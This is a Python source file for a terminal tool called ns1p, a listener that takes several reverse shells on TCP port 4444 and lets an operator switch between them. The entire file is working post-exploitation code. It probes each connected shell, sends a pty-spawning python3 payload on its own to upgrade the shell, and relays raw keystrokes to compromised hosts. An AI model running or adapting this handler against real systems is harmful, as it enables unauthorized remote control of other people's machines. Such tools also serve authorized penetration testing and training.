#!/usr/bin/env python3

import sys
import traceback
import time
import termios
import tty
import select

import collections
import asyncio

import textual
from textual import events
from textual.app import App, ComposeResult
from textual.widgets import Static, ListView, ListItem, Label, RichLog

class ShellSession:
    def __init__(self, session_id, name, reader, writer):
        self.session_id = session_id
        self.name = name
        self.reader = reader
        self.writer = writer
        self.read_deque = collections.deque()

class NShellsOnePortApp(App):
    """Accepts N reverse shell on one tcp port"""

    def compose(self) -> ComposeResult:
        self.session_list = []
        self.session_list_view = None
        self.next_session_id = 0
        self.write_lock = asyncio.Lock()

        self.readline_mode = False

        yield Static("ns1p - N Shells 1 Port")

        self.session_list_view = ListView()
        yield self.session_list_view

        self.log_view = RichLog(highlight=True, markup=True, wrap=True)
        yield self.log_view

    async def on_list_view_selected(self, event: ListView.Selected):
        session_id = int(event.item.id.split('session_')[1])
        session = next(s for s in self.session_list if s.session_id == session_id)
        self.log_view.write(f"[*] Selected session {session.name}")
        with self.suspend(), RawStdin():
            def console_data_loop():
                menu = False

                try:
                    # TODO: implement a history function
                    while not menu and session in self.session_list:
                        try:
                            data = session.read_deque.popleft()
                            data = data.replace(b'\n', b'\r\n')
                            sys.stdout.buffer.write(data)
                            sys.stdout.buffer.flush()
                        except IndexError:
                            pass

                        if self.readline_mode:
                            pass
                        else: #raw mode
                            # stdin read is non blocking because we disabled Canonical Mode and set VMIN=VTIME=0
                            b = sys.stdin.buffer.read(1)
                            if len(b) > 0:
                                if b == b'\x02': #STX aka Ctrl-B
                                    menu = True
                                else:
                                    session.writer.write(b)
                except Exception as e:
                    self.log_view.write(f"[-] Exception in console_data_loop: {e}\n{traceback.format_exc()}")
            # WARNING: this also seems to silence errors
            await asyncio.get_running_loop().run_in_executor(None, console_data_loop)

    async def on_ready(self) -> None:
        self.log_view.write("Welcome to ns1p - N Shells 1 Port")
        self.log_view.write("Connect a reverse shell and use the arrow keys to select a session")
        self.log_view.write("Use the enter key to interact with a session")
        self.log_view.write("You can bring up this menu at any time by pressing Ctrl-B")
        self.log_view.write("In readline mode it may be necessary to submit a line containing Ctrl-B (\\x03) using the enter key")
        self.log_view.write("")
        self.run_worker(self.master_server())

    async def update_session_list_view(self) -> None:
        async with self.write_lock:
            await self.session_list_view.clear()
            self.session_list_view.extend([ListItem(Label(s.name), id=f"session_{s.session_id}") for s in self.session_list])

    async def rshell_client(self, reader, writer) -> None:
        async def read_stream(reader, timeout=.2):
            res = b""
            async def read_all():
                nonlocal res
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    res += data
            try:
                await asyncio.wait_for(read_all(), timeout=timeout)
            except TimeoutError:
                pass
            return res

        # errors here are silenced somehow so we need to catch them ourselves
        try:
            addr = writer.get_extra_info('peername')
            async with self.write_lock:
                session_id = self.next_session_id
                self.next_session_id += 1
                session_name = f"{session_id}: {addr}"
                session = ShellSession(session_id, session_name, reader, writer)
                self.session_list.append(session)
            await self.update_session_list_view()
            self.log_view.write(f"[*] New session {session_name}")
    
            async def shell_feature_check():
                self.log_view.write(f"[*] Session {session_id}: Initiating shell_feature_check")
                writer.write(b"\n\n\n")
                await writer.drain()
                # read any potentially remaining data (banner, leftover command output)
                self.log_view.write(f"[*] Session {session_id}: Waiting 1 second for shell to settle")
                await read_stream(reader, timeout=1)

                stdin_live_echo = False
                stdin_late_echo = False
                command_echo = False
                writer.write(b"echo ns1p")
                await writer.drain()
                data = await read_stream(reader, timeout=.5)

                if not data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs")
                elif b"echo ns1p" in data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does live-echo inputs")
                    stdin_live_echo = True
                else:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data)")

                writer.write(b"\n")
                await writer.drain()
                data = await read_stream(reader)

                if not data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
                elif not stdin_live_echo and b"ns1p" in data and not b"echo ns1p" in data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands but doesn't echo inputs")
                    command_echo = True
                elif b"echo ns1p" in data and data.count(b"ns1p") >= 2:
                    stdin_late_echo = True
                    command_echo = True
                    if not stdin_live_echo:
                        self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs but only after sending newline")
                        # cmd.exe and powershell echos the command only after pressing enter
                    else:
                        self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
                elif stdin_live_echo and data.count(b"ns1p") >= 1: #theoretically we should check == 1 but the count might be higher from e.g. PS1
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
                    command_echo = True
                else:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data: {data})")

                # Ctrl-C check

                # stage command but dont run it
                writer.write(b"echo ns1p")
                await writer.drain()
                # ignore any potential echoing
                await read_stream(reader)
 
                # send Ctrl-C
                writer.write(b"\x03")
                await writer.drain()

                data = await read_stream(reader)

                # if we get no data, a verbatim echoed Ctrl-C or a bell we assume the shell does not have working Ctrl-C
                if not data or data == b"\x03" or data == b"\x07":
                    ctrl_c = False
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to NOT support Ctrl-C")
                else:
                    ctrl_c = True
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to support Ctrl-C")

                # clear potential leftovers in stdin
                writer.write(b"\n")
                await writer.drain()
                await read_stream(reader)

                self.log_view.write(f"[*] Session {session_id}: shell_feature_check concluded. Result (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = {(stdin_live_echo, stdin_late_echo, command_echo, ctrl_c)}")
                return (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c)

            (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = await shell_feature_check()
            # this check in its current form does not stabilize on a pure bash reverse shell => no Ctrl-C
            # it also attempts to linux stabilize a windows shell (although this doesnt break anything)
            if command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
                self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
                writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                await writer.drain()
                (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = await shell_feature_check()
            elif command_echo and stdin_late_echo and not (stdin_live_echo or ctrl_c):
                # this is most likely a windows shell
                # enable readline mode
                pass
            # TODO: have some kind of readline mode

            # send a final newline to print PS1 again
            writer.write(b"\n")
            await writer.drain()

            try:
                while True:
                    data = await reader.read(1024)
                    if not data:
                        break
                    session.read_deque.append(data)
        
                self.log_view.write(f"[*] Session {session_name} closed")
                writer.close()
                await writer.wait_closed()
            except ConnectionResetError:
                self.log_view.write(f"[*] Session {session_name} closed: connection reset")

            async with self.write_lock:
                self.session_list.remove(session)
            await self.update_session_list_view()
            self.log_view.write(f"[*] Session {session_name} removed")

        except Exception as e:
            self.log_view.write(f"[-] Exception in rshell_client {e}\n{traceback.format_exc()}")
    
    async def master_server(self, host='0.0.0.0', port=4444):
        server = await asyncio.start_server(self.rshell_client, host, port)
        addr = server.sockets[0].getsockname()
        self.log_view.write(f"[*] Listening on {addr}")
        async with server:
            await server.serve_forever()

class RawStdin:
    def __enter__(self):
        self.fd = sys.stdin.fileno()
        self.old_attributes = termios.tcgetattr(self.fd)

        new_attributes = termios.tcgetattr(self.fd)

    
        #tty.cfmakeraw(new_attributes)
        # tty.cfmakeraw is only in python >=3.12
        # do it manually
        new_attributes[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK | termios.ISTRIP | termios.INLCR | termios.IGNCR | termios.ICRNL | termios.IXON)        
        new_attributes[1] &= ~termios.OPOST
        new_attributes[2] &= ~(termios.CSIZE | termios.PARENB)
        new_attributes[2] |= termios.CS8
        new_attributes[3] &= ~(termios.ECHO | termios.ECHONL | termios.ICANON | termios.ISIG | termios.IEXTEN)

        new_attributes[0] |= termios.ICRNL
        new_attributes[6][termios.VMIN] = b"\x00"
        new_attributes[6][termios.VTIME] = b"\x00"
        termios.tcsetattr(self.fd, termios.TCSANOW, new_attributes)

    def __exit__(self, exc_type, exc_val, exc_tb):
        termios.tcsetattr(self.fd, termios.TCSANOW, self.old_attributes)

if __name__ == '__main__':
    NShellsOnePortApp().run()

